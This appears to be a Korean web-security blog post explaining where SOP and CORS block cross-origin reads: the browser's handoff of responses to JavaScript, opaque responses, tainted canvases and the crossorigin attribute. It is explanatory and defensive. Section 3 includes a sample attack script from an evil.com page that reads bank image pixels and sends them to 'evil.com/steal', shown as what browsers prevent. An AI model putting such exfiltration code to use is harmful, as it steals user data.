---
title: WEB - 브라우저가 서버 응답을 JS에 넘기기까지 ("JS가 응답을 읽는다"의 의미)
date: 2026-11-14 21:00:00 +0900
categories: [지식 더하기, 이론]
tags: [WEB]
---

> SOP/CORS가 막는 것은 "요청"이 아니라 **허락받지 않은 origin의 JS가 응답 내용을 손에 쥐는 것**이다. <br>
> 그 "읽는다"는 브라우저가 응답을 JS에 넘기는 지점이고, JS 없이 브라우저가 직접 응답을 처리하는 요청도 있다. <br>
> CORS 자체의 동작은 [CORS 글](/posts/cors/)에서 다룬다.

## 1. 요청부터 JS가 응답을 받기까지

---

> `fetch()` / `axios`를 호출해도 JS가 직접 네트워크 통신을 하지 않는다. 실제 통신은 **브라우저**가 하고, JS는 나중에 결과만 넘겨받는다.

```text
[JS]  fetch('https://api.b.com/data', { credentials: 'include' })
  │   → 이 시점에 JS가 손에 쥔 것은 Promise 하나뿐
  ▼
[브라우저 네트워크 계층]
  ① 요청 생성: Origin: https://a.com 헤더 추가, b.com 쿠키 첨부
  ② 서버로 전송
  ▼
[서버 b.com]
  ③ 요청 처리 (DB 조회·변경 등 부수효과는 여기서 이미 발생)
  ④ 응답 + CORS 헤더(Access-Control-Allow-Origin 등) 전송
  ▼
[브라우저 네트워크 계층]
  ⑤ 응답 전체 수신 (본문까지 브라우저 메모리에 존재)
  ⑥ CORS 검사: ACAO가 요청 Origin과 일치하는가? 쿠키를 보냈다면 ACAC: true 인가?
  │
  ├─ 통과 → Promise resolve(Response)
  │          → JS가 res.json(), res.headers 로 내용을 꺼냄   ← "JS가 응답을 읽는다"
  │
  └─ 실패 → 응답을 버리고 Promise reject(TypeError: Failed to fetch)
             → JS는 상태코드도 본문도 모르고 "실패했다"는 사실만 앎
```

> 응답은 브라우저까지 도착한다. 막히는 지점은 ⑥, **브라우저가 JS에 응답을 넘겨주는 단계**다.

### ⑥에서 막는다는 것의 의미

* **서버는 이미 요청을 처리했다.** CORS가 막는 건 *읽기*뿐이다. 단순 요청(simple request)이면 서버 쪽 부수효과는 이미 일어난 뒤다. 그래서 **CORS는 CSRF 방어 수단이 아니다.**
* **Preflight가 이 빈틈을 보완한다.** `PUT`/`DELETE`, `Content-Type: application/json` 등 단순하지 않은 요청은 브라우저가 먼저 `OPTIONS`로 허용 여부를 묻고, 허용되지 않으면 **본 요청 자체를 보내지 않는다.** 이 `OPTIONS` 요청/응답도 브라우저가 처리하며 JS에는 보이지 않는다.
* **개발자 도구 Network 탭에는 응답이 보이는 경우가 많다.** 브라우저는 실제로 응답을 받았기 때문이다. JS 코드로는 접근할 수 없다.

## 2. 응답을 "소비"하는 주체는 둘이다

---

> 응답을 쓰는 주체는 JS만이 아니다. **JS가 보내지 않는 요청**도 많고, 그 응답은 브라우저가 직접 소비한다.

```html
<img src="https://b.com/photo.png">
```

```text
브라우저가 HTML 파싱 → <img> 발견
→ 브라우저가 직접 GET https://b.com/photo.png 요청   (JS 코드 0줄)
→ PNG 바이트 수신
→ 브라우저가 디코딩해서 화면에 픽셀로 그림
```

이 과정에 JS는 전혀 관여하지 않는다. 응답 바이트를 받아 쓰는 주체가 브라우저이므로 **"브라우저가 소비하는 응답"**이다.

| | 요청 주체 | 응답을 쓰는 곳 | JS가 내용을 읽을 수 있나 |
| --- | --- | --- | --- |
| `fetch()` / `axios` | JS | JS (`response.data`) | CORS 허용 시에만 ○ |
| `<img>`, `<iframe>`, `<script src>`, `<link rel=stylesheet>`, `<video>` | 브라우저 | 브라우저 (렌더링·실행·스타일 적용) | ✕ 화면엔 반영되지만 데이터로는 못 꺼냄 |

### 브라우저가 직접 처리하는 요청들 (임베딩)

> SOP가 생기기 전부터 웹에서 허용되던 "임베딩" 방식이라, **다른 origin이어도 CORS 없이 요청이 나가고 결과가 화면에 반영**된다.

| 요청 방식 | 응답을 쓰는 주체 | JS 접근 |
| --- | --- | --- |
| `<img src>` | 브라우저 (렌더링) | ✕ 픽셀 못 읽음. canvas에 그리면 tainted → `getImageData` 차단 |
| `<script src>` | 브라우저 (실행) | ✕ 코드는 실행되지만 소스 텍스트는 못 읽음. 에러도 `"Script error."`로 가려짐 |
| `<link rel="stylesheet">`, `<video>` | 브라우저 | ✕ |
| `<iframe>` | 브라우저 (페이지 렌더링) | ✕ 안쪽 DOM 접근은 SOP가 차단 |
| `<form action method="POST">` 제출 | 브라우저 (페이지 이동) | ✕ 페이지 자체가 넘어감. 원래 페이지 JS에는 응답이 안 옴 |
| `fetch(url, { mode: 'no-cors' })` | - | ✕ opaque 응답 (status 0, 본문 비어 있음) |
| `navigator.sendBeacon()` | - | ✕ 보내기만 하고 응답 없음 |

이 요청들도 **요청은 나가고, 쿠키도 붙고(SameSite 범위 내), 서버도 처리한다.** 응답 내용이 JS 손에 들어가지 않을 뿐이다.

* 다른 origin으로 **보내는 것(쓰기)** 은 원래부터 막히지 않는다. CSRF 방어는 SameSite 쿠키, CSRF 토큰 등 **서버 몫**이다.
* 다른 origin의 응답을 **읽는 것**은 SOP가 막는다. CORS는 서버가 "이 origin의 JS에는 보여 줘도 된다"고 허락하는 장치다.

## 3. JS는 img / iframe에 어떻게 접근하고, 어디서 막히나

---

> JS가 잡을 수 있는 건 **DOM 요소(태그)**이지 **응답 바이트**가 아니다.

```js
const img = document.querySelector('img');
img.src;    // "https://b.com/photo.png" → 내가 쓴 URL일 뿐
img.width;  // 크기 정도는 알 수 있음
```

이미지의 **실제 내용(픽셀)**을 꺼내려면 canvas에 그린 뒤 읽어야 하는데, **바로 여기서 막힌다.**

```js
const canvas = document.createElement('canvas');
const ctx = canvas.getContext('2d');
ctx.drawImage(img, 0, 0);          // 그리기는 됨
ctx.getImageData(0, 0, 100, 100);  // SecurityError (다른 origin 이미지)
canvas.toDataURL();                // SecurityError
```

다른 origin 이미지를 그린 canvas에는 "오염됨(tainted)" 표시가 붙고, 이후 픽셀 읽기가 거부된다.

iframe도 원리가 같다.

```js
const frame = document.querySelector('iframe'); // src="https://b.com"
frame.contentDocument;          // null
frame.contentWindow.document;   // SecurityError
```

화면에는 b.com 페이지가 보이지만 a.com의 JS는 그 안의 텍스트·입력값을 읽을 수 없다.

### 막아야 하는 이유 : 공격 시나리오

```html
<!-- 해커 사이트 evil.com -->
<img id="x" src="https://bank.com/my-account-qr.png">
<script>
  // 사용자 브라우저엔 bank.com 쿠키가 있으니 "그 사용자의" 계좌 QR이 로드됨
  ctx.drawImage(x, 0, 0);
  const pixels = ctx.getImageData(...);              // 이게 된다면
  fetch('https://evil.com/steal', { body: pixels }); // 유출
</script>
```

* 사용자 **눈에 보이는 것**은 문제가 아니다. 원래 본인 데이터다.
* 문제는 **evil.com의 JS가 그 내용을 데이터로 손에 쥐는 것**이고, 브라우저는 그 지점(`getImageData`)을 차단한다.

## 4. opaque 응답

---

> **브라우저는 내용을 갖고 있지만, JS에게는 열어 볼 수 없는 봉인된 상자로만 건네주는 응답**이다.

* `<img>`: 브라우저는 픽셀을 갖고 있고 화면에도 그리지만, JS가 꺼내려 하면 거부한다.
* `fetch(url, { mode: 'no-cors' })`: 요청은 나가지만 JS가 받는 `Response`는 비어 있다.

```js
const res = await fetch('https://b.com/data', { mode: 'no-cors' });
res.type;          // "opaque"
res.status;        // 0     ← 실제로는 200이었어도
await res.text();  // ""    ← 실제 본문이 있어도 빈 값
```

임베딩 요청에 CORS 검사가 "생략"되는 게 아니라, **응답을 JS가 열 수 없는 상태로만 렌더링·실행에 쓰기 때문에 허락이 필요 없는 것**이다.

## 5. `crossorigin` 속성 : 태그 요청을 CORS 모드로 전환

---

> `crossorigin`은 **"이 태그의 요청을 no-cors가 아니라 CORS로 보내라"**는 지시다. 서버가 CORS 헤더로 허락하면 opaque가 아닌 응답이 되어 JS가 내용에 접근할 수 있다.

임베딩 태그도 JS가 내용을 읽어야 할 때가 있다. (canvas 픽셀, 스크립트 에러 상세 등) 이때 `crossorigin` 속성을 쓴다.

### 속성이 바꾸는 것

| | 속성 없음 | `crossorigin` 있음 |
| --- | --- | --- |
| 요청 모드 | `no-cors` | `cors` |
| `Origin` 헤더 | 없음 | 붙음 |
| 서버가 허락하면 | (허락 개념 없음) opaque | JS가 내용 접근 가능 |
| 서버가 허락 안 하면 | 화면엔 정상 표시 | **리소스 로드 자체가 실패** (`onerror`, 화면에도 안 나옴) |

속성을 붙였는데 서버가 `Access-Control-Allow-Origin`을 주지 않으면 "보이지만 못 읽는" 상태가 아니라 **아예 깨진다.** CORS 검사 실패로 `fetch`가 reject된 것과 같은 상황이다.

### 값 종류

| 값 | fetch로 치면 | 쿠키 전송 | 서버 응답 헤더 요구사항 |
| --- | --- | --- | --- |
| (속성 없음) | `mode: 'no-cors'` | 보냄 (SameSite 범위 내) | 없음 |
| `anonymous` / `crossorigin=""` | `mode: 'cors', credentials: 'same-origin'` | 다른 출처면 **안 보냄** | `ACAO: *` 또는 요청 origin |
| `use-credentials` | `mode: 'cors', credentials: 'include'` | **보냄** | `ACAO: 요청 origin 정확히` + `ACAC: true` (`*` 불가) |

* 잘못된 값(`crossorigin="foo"`)은 `anonymous`로 처리한다.
* 공개 리소스(CDN 이미지·폰트·스크립트)는 `anonymous` + 서버 `ACAO: *` 조합이 일반적이다.
* 사용자별 리소스를 읽어야 할 때만 `use-credentials`를 쓴다.

### 태그별로 열리는 것

| 태그 | `crossorigin` + 서버 허락 시 가능해지는 것 |
| --- | --- |
| `<img>`, `<video>` | canvas에 그린 뒤 `getImageData`, `toDataURL` (tainted 안 됨) |
| `<script>` | 에러 시 `"Script error."` 대신 상세 메시지·스택 (Sentry 등 에러 수집에 필요) |
| `<link rel="stylesheet">` | JS로 `sheet.cssRules` 읽기 |
| `<script integrity>`, `<link integrity>` (SRI) | 다른 출처 리소스 무결성 검증. **`crossorigin`이 없으면 응답이 opaque라 검증에 실패해 로드가 차단됨** |

`<script type="module">`과 웹폰트(`@font-face`)는 속성이 없어도 **기본이 CORS 모드**다. 다른 출처에서 가져오려면 서버 허락이 필수다. (CDN 폰트가 CORS 에러로 안 뜨는 흔한 원인)

> 기준은 "태그 종류"가 아니라 **"JS가 내용을 읽느냐"**다.

## 6. 임베딩이라고 완전히 안전한 건 아니다 (CORS 범위 밖 위협)

---

> 내용을 직접 읽지 못해도 간접적으로 새는 경로가 있어, CORS와 별개의 방어 장치가 있다.

| 경로 | 무엇이 새나 | 방어책 |
| --- | --- | --- |
| `<script src>`로 다른 origin의 JS/JSON 실행 | 응답이 JS로 실행 가능하면 공격자 컨텍스트에서 실행되며 데이터 노출 (XSSI, JSONP) | JSONP 지양, `X-Content-Type-Options: nosniff`, CORB/ORB |
| `onload`/`onerror`, 이미지 크기, 응답 시간 | "로그인 상태인지", "리소스가 있는지" 같은 간접 정보 (XS-Leaks) | SameSite 쿠키, `Cross-Origin-Resource-Policy` |
| `<iframe>`으로 화면 덮어씌우기 | 정보 유출이 아니라 사용자를 속여 클릭 유도 (Clickjacking) | `X-Frame-Options`, CSP `frame-ancestors` |

## 요약

---

> SOP/CORS는 요청이 아니라 **브라우저가 응답을 JS에 넘기는 단계**를 막는다.

1. 응답은 **브라우저까지는 항상 도착**하고, 서버도 이미 요청을 처리했다. SOP/CORS가 막는 건 **브라우저 → JS로 응답을 넘기는 단계**다.
2. 응답을 소비하는 주체는 **JS(fetch/axios)**와 **브라우저 자신(img/script/iframe/form 등)** 둘이다.
3. 브라우저가 직접 소비하는 응답은 **opaque**다. 화면에 그리거나 실행만 하고, JS에는 데이터로 넘기지 않는다. 그래서 CORS 허락 없이도 다른 origin 리소스를 임베딩할 수 있다.
4. JS가 임베딩 리소스 내용을 읽으려 하면(canvas `getImageData`, iframe DOM 등) 그 지점에서 차단된다.
5. `crossorigin` 속성은 태그 요청을 CORS 모드로 바꿔, 서버가 허락하면 JS가 읽을 수 있게 한다. 허락이 없으면 로드 자체가 실패한다.
6. 다른 origin으로 **보내는 것**은 원래 막히지 않는다. CSRF는 CORS가 아니라 SameSite·CSRF 토큰으로 막고, 임베딩의 간접 유출은 CORB/CORP·`X-Frame-Options` 등 별도 장치로 막는다.
